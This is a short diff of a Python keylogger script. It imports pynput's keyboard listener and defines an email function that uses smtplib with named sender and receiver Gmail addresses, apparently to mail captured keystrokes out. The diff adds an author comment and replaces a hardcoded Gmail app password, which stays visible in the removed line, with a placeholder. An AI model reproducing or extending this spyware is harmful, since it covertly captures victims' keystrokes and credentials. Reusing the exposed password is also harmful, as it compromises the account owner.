@@ -1,6 +1,7 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
+#Author ~Armin~ My Programming Name ~SaMi~
 count = 0
 keys = []
 
@@ -11,7 +12,7 @@ def send_Email(message):
     import smtplib
 
     email_sender = 'arsamdev7@gmail.com'
-    email_password = 'kgxnjqcznxympgvc'
+    email_password = 'Put_your_own_app_Geberated_password_not_gmail_mail_password'
     email_receiver = 'arminttwat@gmail.com'
 
     subject = 'Test v1.0 Send JPG Files ( emaile automated by python !'
